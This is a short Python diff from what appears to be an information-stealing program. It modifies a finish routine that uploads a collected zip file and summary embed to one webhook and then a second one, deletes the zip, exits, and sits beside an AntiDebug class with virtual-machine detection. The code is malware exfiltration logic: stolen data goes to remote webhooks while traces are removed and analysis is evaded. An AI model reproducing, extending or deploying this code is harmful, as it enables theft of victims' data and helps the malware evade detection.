@@ -897,18 +897,19 @@ def finish(self):
             key = TOTP(self.fetch_conf("webhook_protector_key")).now()
             httpx.post(self.webhook, headers={"Authorization": key}, json=embed)
             httpx.post(self.webhook, headers={"Authorization": key}, files={"upload_file": f})
-    
-    # Adding the code to post to the second webhook
-    if self.hook_reg in self.webhook2:
-        httpx.post(self.webhook2, json=embed)
-        httpx.post(self.webhook2, files={"upload_file": f})
-    else:
-        key = TOTP(self.fetch_conf("webhook_protector_key")).now()
-        httpx.post(self.webhook2, headers={"Authorization": key}, json=embed)
-        httpx.post(self.webhook2, headers={"Authorization": key}, files={"upload_file": f})
+        
+        # Adding the code to post to the second webhook
+        if self.hook_reg in self.webhook2:
+            httpx.post(self.webhook2, json=embed)
+            httpx.post(self.webhook2, files={"upload_file": f})
+        else:
+            key = TOTP(self.fetch_conf("webhook_protector_key")).now()
+            httpx.post(self.webhook2, headers={"Authorization": key}, json=embed)
+            httpx.post(self.webhook2, headers={"Authorization": key}, files={"upload_file": f})
 
     os.remove(_zipfile)
     self.hazard_exit()
+
 
 class AntiDebug(Functions):
     inVM = False
